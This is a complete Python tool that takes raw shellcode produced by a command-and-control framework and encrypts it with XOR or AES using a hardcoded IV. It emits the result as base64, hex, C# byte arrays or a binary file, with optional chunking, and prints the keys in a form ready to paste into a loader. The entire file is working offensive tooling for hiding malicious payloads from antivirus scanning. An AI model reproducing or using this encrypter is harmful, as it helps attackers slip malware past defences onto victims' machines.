### Python3 script
import sys, base64, random, string, argparse, os
import pyperclip 	# clipboard for all OS's
# AES stuff
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto import Random


def main(args=sys.argv[1:]):
	# Instantiate the argument parser
	parser = argparse.ArgumentParser(description='Shellcode XOR/AES encrypter')
	parser.add_argument('-file', '-f', help="Raw binary shellcode file from C2")
	parser.add_argument('-algo', '-a', type=str, help="The encryption algorithm", choices=['xor', 'aes'])
	parser.add_argument('-key', '-k', default='random', type=str, help="Create a random encryption key or use key provide by input (Use \"random\" as argument or provide your own key)")
	parser.add_argument('-output', '-o', type=str, help="Type of shellcode to output (args: base64, hex, csharp, raw)", choices=['b64','hex','csharp','raw'])
	parser.add_argument('-chunked', '-c', help="Split shellcode into 4 even chunks (separated by new lines)", action='store_true', required=False)
	args = parser.parse_args(args)

	inputFile = args.file
	output = args.output
	algo = args.algo
	key = args.key
	chunk = args.chunked

	if not inputFile:
		print("[-] ERROR! Missing input file parameter '-f'")
		print("[-] Enter '-h' for help menu")
		sys.exit()
	elif not output:
		print("[-] ERROR! Missing output type parameter '-o'")
		print("[-] Enter '-h' for help menu")
		sys.exit()
	elif not algo:
		print("[-] ERROR! Missing algorithm parameter '-a'")
		print("[-] Enter '-h' for help menu")
		sys.exit()

	IV = None # init IV for AES

	# Get shellcode from input file
	print(f"[*] Getting shellcode from file: {inputFile}")
	shellcode = getShellcode(inputFile)

	print(f'[*] Shellcode input length: {len(shellcode)}')
	
	if key == 'random':
		encKey = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
	else:
		encKey = key

	# Perform XOR encryption with random generated key
	if algo == 'xor':
		encryptedShellCode = bytearray(byt ^ ord(encKey[i % len(encKey)]) for i, byt in enumerate(shellcode))

	# Perform AES encryption
	elif algo == 'aes':
		# Hardcoded IV - Change as needed
		IV = b'1234567890123456' 

		#KEY = get_random_bytes(16)
		AES_Key = bytes(encKey, 'utf-8')

		if (len(encKey) != 16) and (len(encKey) != 24) and (len(encKey) != 32):
			print("[-] ERROR! AES encryption must use key length of 16, 24 or 32")
			print("[-] Enter a new key or use '-k random' to auto-generate a key")
			sys.exit()

		encryptedShellCode = AESencrypt(AES_Key, IV, shellcode)


	########## Output Encoding Functions ##########

	# Copy encrypted base64 shellcode to Clipboard
	if output == 'b64':
		base64Shellcode = b64EncodeShellCode(encryptedShellCode)

		# Copy base64 encrypted shellcode to clipboard
		copyShellcodeToClipboard(base64Shellcode, chunk)
		print("[+] Encrypted BASE64 shellcode has been copied to Clipboard!")


	# Copy encrypted hex shellcode to Clipboard
	elif output == 'hex':
		# Get hex encrypted shellcode and print
		encryptedHexCode = getEncryptedHexShellcode(bytearray(encryptedShellCode))
		
		# Copy hex encrypted shellcode to clipboard
		copyShellcodeToClipboard(encryptedHexCode, chunk)
		print("[+] Encrypted {} shellcode has been copied to Clipboard!".format(algo.upper()))


	elif output == 'csharp':
		encryptedCSharpCode = getEncryptedHexCSharpShellcode(encryptedShellCode)

		# Copy CSharp encrypted shellcode to clipboard
		copyShellcodeToClipboard(encryptedCSharpCode, chunk)
		print("[+] Encrypted CSharp shellcode has been copied to Clipboard!")


	# Save encrypted raw binary to output file
	elif output == 'raw':
		filename = "shellcode-raw-encrypted.bin"
		print("[+] Saving encrypted shellcode to output binary file")
		print("[+] Output file name: " + filename)

		outputFile = open(filename,"wb")
		for byte in encryptedShellCode:
			outputFile.write(byte.to_bytes(1,byteorder='big'))


	########## Print encryption key ##########
	print("[+] {} Encryption KEY: {}".format(algo.upper(), encKey)) # AES/XOR key
	# Print AES key and IV
	if IV:
		print('[+] AESkey[] = { 0x' + ',0x'.join(hex(x)[2:] for x in bytes(encKey, 'utf-8')) + ' };')
		print("[+] IV: {}".format(IV))
		print('[+] IV[] = { 0x' + ',0x'.join(hex(x)[2:] for x in IV) + ' };')

#end main()

##################### Script Functions #####################

def getShellcode(filePath):
	# RAW shellcode
	with open(filePath, 'rb') as shellcode_file:
		file_shellcode = shellcode_file.read()
		return file_shellcode


def copyShellcodeToClipboard(shellcode, chunk):
	#Check if we split shellcode into chunks from command-line input "-chunked"
	if chunk:
		n = round(len(shellcode) / 4)
		print(f"[+] Chunking shellcode into 4-5 parts with average length of {n}")
		chunks = [shellcode[i:i+n] for i in range(0, len(shellcode), n)]
		listToStr = '\n'.join([str(elem) for i,elem in enumerate(chunks)])
		pyperclip.copy(listToStr)
	#Otherwise output shellcode in normal format (one long string)
	else:
		pyperclip.copy(shellcode)


def b64EncodeShellCode(shellcode):
	# Base64 encode the shellcode
	return base64.b64encode(shellcode).decode('ascii')


def getEncryptedHexShellcode(shellcode):
	sc = "\""
	ctr = 0

	for byte in shellcode:
		sc += "\\x%02x" % byte
		
		# Print shellcode separated on new lines
		if ctr == 50:
			sc += "\"\n\"" 
			ctr = 0
		ctr += 1
	return sc


def getEncryptedHexCSharpShellcode(shellcode):
	output = ""
	for byte in bytearray(shellcode):
		output += '0x'
		output += '%02x,' % byte
	return output[:-1] #remove last , character at the end


# AES encryption
def AESencrypt(key, iv, shellcode):
	key_length = len(key)
	if (key_length >= 32):
		k = key[:32]
	elif (key_length >= 24):
		k = key[:24]
	else:
		k = key[:16]

	aes = AES.new(key, AES.MODE_CBC, iv)
	pad_text = AESpad(shellcode, 16)
	return aes.encrypt(pad_text)


# AES padding input
def AESpad(data, block_size):
	padding_size = (block_size - len(data)) % block_size
	if padding_size == 0:
		padding_size = block_size
	padding = (bytes([padding_size]) * padding_size)
	return data + padding


##################### Main #####################
if __name__ == '__main__':
	main()
